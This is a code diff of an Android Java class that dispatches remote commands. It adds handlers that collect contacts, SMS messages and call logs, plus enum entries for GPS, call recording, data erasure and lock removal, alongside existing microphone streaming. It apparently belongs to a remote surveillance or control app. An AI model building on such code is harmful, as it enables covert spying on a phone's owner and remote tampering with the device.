@@ -9,7 +9,7 @@ import java.util.Map;
 
 public class DataHandler {
 
-    static Map<Integer, Feature> FDict = new HashMap<>();
+    private static Map<Integer, Feature> FDict = new HashMap<>();
 
     static void distribute(String FullOrder, Context context) {
         int order = -1, orderType = -1;
@@ -73,8 +73,31 @@ public class DataHandler {
                 FDict.get(eDataType.MIC.ordinal()).stopStream();
                 FDict.remove(eDataType.MIC.ordinal());
             }
+        }
+        else if (order == eDataType.CONTACTS.ordinal()) {
+
+            Feature c = new Contacts();
+            c.init(order);
+            FDict.put(order, c);
 
         }
+
+        else if (order == eDataType.SMS.ordinal()) {
+
+            Feature c = new SMS();
+            c.init(order);
+            FDict.put(order, c);
+
+        }
+        else if (order == eDataType.CALL_LOG.ordinal()) {
+
+            Feature c = new Call_Log();
+            c.init(order);
+            FDict.put(order, c);
+
+        }
+
+
 
     }
 
@@ -99,6 +122,14 @@ public class DataHandler {
         MIC,
         FM_LIST,
         FM_DOWN,
+        CONTACTS,
+        SMS,
+        GPS,
+        CALL_LOG,
+        CALL_RECORDS,
+        ERASE_DATA,
+        REMOVE_PATTERN_LOCK,
+        MAKE_NOISE,
         ERROR
     }
 }
